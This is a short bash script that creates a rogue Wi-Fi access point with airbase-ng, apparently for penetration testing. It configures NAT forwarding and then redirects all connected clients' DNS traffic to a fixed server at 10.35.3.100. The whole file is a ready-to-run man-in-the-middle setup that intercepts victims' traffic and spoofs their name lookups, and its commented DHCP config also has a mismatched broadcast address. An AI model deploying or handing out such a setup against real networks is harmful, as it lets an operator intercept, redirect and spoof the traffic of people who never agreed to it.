#!/bin/bash

# Setup
# You will need to install a DHCP server
# 	apt-get install dhcp3-server
#
#ddns-update-style ad-hoc;
#        default-lease-time 600;
#        max-lease-time 7200;
#        authoritative;
#        subnet 192.168.2.128 netmask 255.255.255.128 {
#        option subnet-mask 255.255.255.128;
#        option broadcast-address 10.0.0.255;
#        option routers 192.168.2.129;
#        option domain-name-servers 8.8.8.8;
#        range 192.168.2.130 192.168.2.140;
#        }
#




# Edit the script below to set your correct wlan interface and internet interface (if applicable)


echo "Killing Airbase-ng..."
pkill airbase-ng
sleep 2;
echo "Killing DHCP..."
pkill isc-dhcp-server
sleep 5;

echo "Putting Wlan In Monitor Mode..."
airmon-ng stop wlan0 # Change to your wlan interface
sleep 5;
airmon-ng start wlan0 # Change to your wlan interface
sleep 5;
echo "Starting Fake AP..."
airbase-ng -e "Pentest Network" -c 11 -v mon0 & # Change essid, channel and interface
sleep 5;

ifconfig at0 up
ifconfig at0 192.168.2.129 netmask 255.255.255.128 # Change IP addresses as configured in your dhcpd.conf
route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129

sleep 5;

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # Change eth0 to your internet facing interface
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.35.3.100

#echo > '/var/lib/dhcp3/dhcpd.leases'
#ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
#dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &

sleep 5;
echo "1" > /proc/sys/net/ipv4/ip_forward
